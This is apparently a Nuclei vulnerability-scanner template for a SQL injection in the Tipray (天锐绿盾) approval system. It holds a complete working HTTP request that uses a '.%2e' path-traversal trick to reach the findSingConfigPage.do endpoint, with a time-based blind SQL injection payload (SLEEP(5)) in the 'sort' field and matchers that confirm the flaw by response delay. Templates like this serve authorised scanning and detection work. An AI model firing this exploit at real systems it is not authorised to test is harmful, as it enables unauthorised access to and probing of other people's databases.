id: tipray-findSingConfigPage-sqli
info:
  name: 天锐绿盾审批系统 findSingConfigPage 存在SQL注入
  author: leadlife
  severity: high
  description: 
  reference: 
    - https://bdziyi.com/67194/
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
    tips:
    repair:
    sqlmap:
    version:
  tags: sqli,tipray

http:
  - raw:  
      - |
        @timeout: 15s
        POST /trwfe/login.jsp/.%2e/thirdSystemConfig/findSingConfigPage.do HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
        Priority: u=1
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Upgrade-Insecure-Requests: 1
        Content-Type: application/x-www-form-urlencoded

        sort=app_id%20OR+(SELECT+1183+FROM+(SELECT(SLEEP(5)))UPad)

    matchers:
      - type: dsl
        dsl:
          # - contains_all(body,'')
          - status_code == 200
          - duration >= 5 && duration < 9
        condition: and